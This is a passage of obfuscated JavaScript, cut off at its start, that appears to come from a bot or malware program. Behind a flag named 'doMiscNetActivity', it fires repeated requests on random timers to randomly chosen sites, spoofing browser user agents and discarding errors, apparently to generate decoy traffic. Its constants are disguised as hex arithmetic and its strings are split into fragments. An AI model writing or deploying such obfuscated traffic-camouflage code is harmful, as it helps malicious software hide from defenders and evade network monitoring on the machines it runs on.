      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1641 + 0x22 * -0x35 + 0x1 * 0x1d4b; k < -0x14f6 + -0x21af + 0x36a9; k++)
    setTimeout(f, (-0x1af26 + 0xde18 + -0x10d * -0x1a6) * k * getRandomInt(-0x1ee3 * 0x1 + 0x3 * -0x5fa + 0x30d2, 0x125a + -0x5c6 + -0x1 * 0xc91));
  setInterval(() => {
    f();
    for (let l = 0xd * 0x2b3 + 0x1215 + -0x352c; l < 0x141 + -0x9fd + 0x8c0; l++)
      setTimeout(f, (0x1955e + -0x12628 + 0x5 * 0x18a2) * l * getRandomInt(0x74 * -0x1c + 0x660 + 0x651, 0xc82 * 0x3 + -0x14d8 + 0x10ab * -0x1));
  }, -0x2 * 0x1257a1 + -0x5f33cb * -0x1 + -0x39609);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1 * 0x1ab4 + 0x984 + 0x2c88) * getRandomInt(0x1c + -0x19c * -0xb + 0x1 * -0x11cf, 0x1ae + -0xb8 * 0x23 + 0x177f));
}, 0x26 + -0x395 * -0x2 + -0x6ec);